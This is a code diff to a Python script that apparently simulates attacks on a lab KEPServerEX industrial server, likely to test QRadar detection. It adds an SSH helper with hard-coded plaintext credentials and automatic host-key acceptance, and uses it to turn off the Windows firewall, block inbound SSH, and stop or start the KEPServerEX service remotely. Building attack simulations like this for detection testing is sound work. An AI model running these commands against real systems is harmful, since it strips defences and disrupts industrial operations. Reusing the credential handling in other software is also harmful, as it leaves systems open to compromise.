@@ -20,6 +20,7 @@ from kepconfig import connection, admin, connectivity
 import json
 import sys
 from Powershell.callPowerShell import runPowerShellScript
+import paramiko
 
 
 
@@ -33,7 +34,9 @@ COPIED_PATH = "C:\\Windows\\temp\\Smartmeter"
 # Set the path for the Smart Meter folder
 SMARTMETER_PATH = "C:\\Users\\Student\\Documents\\AttackFolder"
 
-WINDOWS_SERVER_IP = "172.16.2.77"
+USERNAME = "Student"
+PASSWORD = "Student12345@"
+WINDOWS_SERVER_IP = "172.16.2.223"
 
 POWERSHELL_SCRIPT_PATH = r"Powershell\baseScriptElevated.ps1"
 
@@ -53,6 +56,26 @@ POWERSHELL_SCRIPT_PATH = r"Powershell\baseScriptElevated.ps1"
 #         isAdmin = False
 #     if not isAdmin:
 #         ctypes.windll.shell32.ShellExecuteW(None, "runas", executable, __file__, None, 1)
+
+def ssh_run_commands(command, host=WINDOWS_SERVER_IP, username=USERNAME, password=PASSWORD):
+    ssh_output: str = "" # Declare as string to prevent error proning
+    
+    if password is None:
+        print("Using Hostkey? This is not implemented")
+        return
+
+    ssh = paramiko.SSHClient()
+    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+    ssh.connect(host, username=username, password=password)
+    ssh_stdin, ssh_stdout, ssh_stderr = ssh.exec_command(command)
+    ssh_output_list = ssh_stdout.readlines()
+    for line_no, line in enumerate(ssh_output_list):
+        ssh_output_list[line_no] = line.replace("\r\n", "\n")
+    ssh_output = "".join(ssh_output_list)
+
+    return ssh_output
+
+
 
 # Delete files in a specific folder
 def delete_files(folder_path):
@@ -141,9 +164,9 @@ def copy_file(folder_path):
 # Disable the firewall
 def disable_firewall():
     #cp = run('netsh advfirewall set allprofiles state off',stdout=PIPE , shell=True)
-    cp = runPowerShellScript(POWERSHELL_SCRIPT_PATH, "netsh advfirewall set allprofiles state off")
-    print(cp)
-    if cp.stdout.decode('utf-8').strip() == "Ok.":
+    command_output = ssh_run_commands("netsh advfirewall set allprofiles state off")
+
+    if "Ok." in command_output:
         print("Firewall disabled successfully\nOk.\n")
     else:
         print("Firewall failed to disable\nFail.\n")
@@ -151,8 +174,8 @@ def disable_firewall():
 # Disable SSH from the firewall
 def disable_ssh():
     count = 0
-    cp = run('netsh advfirewall firewall add rule name="QRadar Test" dir=in action=block protocol=TCP localport=22',stdout=PIPE)
-    if cp.stdout.decode('utf-8').strip() == "Ok.":
+    command_output = run('netsh advfirewall firewall add rule name="QRadar Test" dir=in action=block protocol=TCP localport=22',stdout=PIPE)
+    if "Ok." in command_output:
         count += 1
         print("Inbound Firewall Successfully Inserted (Blocked: TCP/22)")
     else:
@@ -1165,19 +1188,53 @@ def disable_running_schedules() -> None:
         print("Successfully disabled \KEPServerEX 6.12 Tasks Scheduler", file=sys.stdout)
         print("Ok.")
     
-
 def kep_server_stop():
-    netshare = run(['sc', 'query', 'KEPServerEXV6'], stdout=PIPE, stderr=PIPE, text=True)
-    if "RUNNING" in netshare.stdout:
-        print("Kepserver is running, Stopping now.")
-        service_name = "KEPServerEXV6"
-        cp = run(["sc", "stop", service_name],stdout=PIPE , check=False)
-        output = cp.stdout.decode('utf-8').strip().split()
-        if "FAILED" in cp.stdout.decode('utf-8'):
-            print("FAILED: " + " ".join(output[4:]) + "\nFail.\n")
-        else:
-            print("The " + output[1] + " service is " + output[9])
-            sleep(15)
+    command_output = ssh_run_commands("sc query KEPServerEXV6")
+    if "RUNNING" in command_output:
+        print("Kepserver is running, Stopping now...")
+        command_output = ssh_run_commands("sc stop KEPServerEXV6")
+        
+        while "STOP_PENDING" in command_output:
+            command_output = ssh_run_commands("sc query KEPServerEXV6")
+            if "FAILED" in command_output:
+                print("FAILED:", "\nFail.\n") 
+                return False
+            elif "STOPPED" in command_output:
+                print("Kepserver is stopped")
+                return True
+            else:
+                print("Kepserver is still stopping... waiting 1 more second")
+                sleep(1)
+    elif "STOPPED" in command_output:
+        print("Kepserver have already stopped")
+        return True
+    else:
+        print("Something went wrong!")
+        return False
+
+def kep_server_start():
+    command_output = ssh_run_commands("sc query KEPServerEXV6")
+    if "STOPPED" in command_output:
+        print("Kepserver is stopped, starting now...")
+        command_output = ssh_run_commands("sc start KEPServerEXV6")
+
+        while "START_PENDING" in command_output:
+            command_output = ssh_run_commands("sc query KEPServerEXV6")
+            if "FAILED" in command_output:
+                print("FAILED:", "\nFail.\n")
+                return False
+            elif "RUNNING" in command_output:
+                print("Kepserver is running!")
+                return True
+            else:
+                print("Kepserver is still starting up... waiting 1 more second")
+                sleep(1)
+    elif "RUNNING" in command_output:
+        print("Kepserver is running!")
+        return True
+    else:
+        print("Something went wrong!")
+        return False
 
 # TODO: kep_server_start()
 
@@ -1192,8 +1249,11 @@ if __name__ == '__main__':
     #     check_admin()
 
     match attack_option:
+        case "start": kep_server_start()
+        case "stop":  kep_server_stop()
         case "1":  create_scheduled_task() 
         #case "2":  create_shared_folder(), copy_file(SMARTMETER_PATH)
+        
         case "3":  disable_firewall()
         case "4":  disable_ssh()
         case "5":  disable_kepserver()
